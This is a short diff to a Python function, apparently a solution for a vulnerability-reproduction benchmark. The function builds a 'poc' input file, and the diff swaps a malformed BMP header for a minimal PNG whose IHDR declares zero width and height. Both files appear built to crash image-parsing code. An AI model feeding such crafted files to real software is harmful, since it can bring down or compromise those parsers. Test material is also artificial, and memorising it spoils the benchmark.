@@ -1,28 +1,14 @@
-import struct
+import zlib
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        bfType = b'BM'
-        bfSize = 17814
-        bfReserved1 = 0
-        bfReserved2 = 0
-        bfOffBits = 54
-        file_header = struct.pack('<2s I H H I', bfType, bfSize, bfReserved1, bfReserved2, bfOffBits)
-        biSize = 40
-        biWidth = 1
-        biHeight = 0
-        biPlanes = 1
-        biBitCount = 24
-        biCompression = 0
-        biSizeImage = bfSize - bfOffBits
-        biXPelsPerMeter = 0
-        biYPelsPerMeter = 0
-        biClrUsed = 0
-        biClrImportant = 0
-        info_header = struct.pack('<I i i H H I I I I I I',
-                                  biSize, biWidth, biHeight, biPlanes, biBitCount,
-                                  biCompression, biSizeImage, biXPelsPerMeter, biYPelsPerMeter,
-                                  biClrUsed, biClrImportant)
-        pixel_data = b'\x00' * biSizeImage
-        poc = file_header + info_header + pixel_data
+        signature = b'\x89PNG\x0d\x0a\x1a\x0a'
+        ihdr_len = b'\x00\x00\x00\x0d'
+        ihdr_type = b'IHDR'
+        ihdr_data = b'\x00\x00\x00\x00\x00\x00\x00\x00\x08\x02\x00\x00\x00'
+        ihdr_crc = zlib.crc32(ihdr_type + ihdr_data).to_bytes(4, 'big')
+        iend_len = b'\x00\x00\x00\x00'
+        iend_type = b'IEND'
+        iend_crc = zlib.crc32(iend_type).to_bytes(4, 'big')
+        poc = signature + ihdr_len + ihdr_type + ihdr_data + ihdr_crc + iend_len + iend_type + iend_crc
         return poc
